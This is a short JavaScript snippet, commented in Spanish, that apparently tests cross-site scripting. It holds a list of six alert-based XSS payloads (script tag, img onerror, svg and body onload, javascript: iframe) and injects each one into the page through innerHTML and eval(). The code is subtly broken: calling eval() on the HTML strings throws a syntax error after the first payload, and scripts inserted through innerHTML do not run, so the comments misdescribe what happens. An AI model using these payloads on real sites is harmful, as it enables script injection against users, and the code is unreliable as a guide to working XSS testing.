const xssPayloads = [
  "<script>alert('XSS1')</script>",
  "<img src='x' onerror='alert(\"XSS2\")'>",
  "<svg onload='alert(\"XSS3\")'>",
  "<body onload='alert(\"XSS4\")'>",
  "alert('XSS')",
  "<iframe src='javascript:alert(\"XSS5\")'></iframe>"
];

xssPayloads.forEach(payload => {
  // Crear un nuevo elemento div
  const div = document.createElement('div');
  
  // Insertar la carga útil en el div
  div.innerHTML = payload;
  
  // Añadir el div al cuerpo del documento para ejecutar la carga útil
  document.body.appendChild(div);
  
  // Si la carga útil es solo una alerta, ejecutarla directamente
  if (payload.includes('alert')) {
    eval(payload);
  }
});
